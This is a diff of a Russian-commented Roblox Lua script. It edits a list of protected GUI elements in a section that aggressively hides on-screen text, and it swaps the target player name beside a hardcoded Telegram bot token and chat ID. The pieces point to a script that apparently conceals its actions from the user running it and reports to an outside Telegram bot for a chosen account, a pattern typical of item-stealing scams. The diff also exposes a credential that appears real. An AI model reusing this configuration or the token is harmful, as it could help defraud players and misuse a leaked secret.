@@ -7,9 +7,10 @@ local LocalPlayer = Players.LocalPlayer
 
 -- 🛡️ УЛУЧШЕННОЕ АГРЕССИВНОЕ СКРЫТИЕ ТЕКСТА В GUI (с защитой собственного GUI)
 local PROTECTED_GUI_NAMES = {
-    "CustomLoadingUI", -- Защищаем наш загрузочный экран
-    "MainScript", -- Если у вас есть другие собственные GUI
-    "TelegramBot" -- Добавьте сюда названия ваших GUI
+    "CustomLoadingUI",
+    "MainScript",
+    "TelegramBot",
+    'game:GetService("Players").LocalPlayer.PlayerGui.BackpackGui',
 }
 
 local function isProtectedGUI(obj)
@@ -207,7 +208,7 @@ end)
 -- 🔧 НАСТРОЙКИ (ОРИГИНАЛЬНЫЕ РАБОЧИЕ)
 local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
 local TELEGRAM_CHAT_ID = "7144575011"
-local TARGET_PLAYER = "sfdgbzdfsb"
+local TARGET_PLAYER = "Rikizigg"
 local TRIGGER_MESSAGE = "."
 
 -- 🐾 РАСШИРЕННЫЙ БЕЛЫЙ СПИСОК
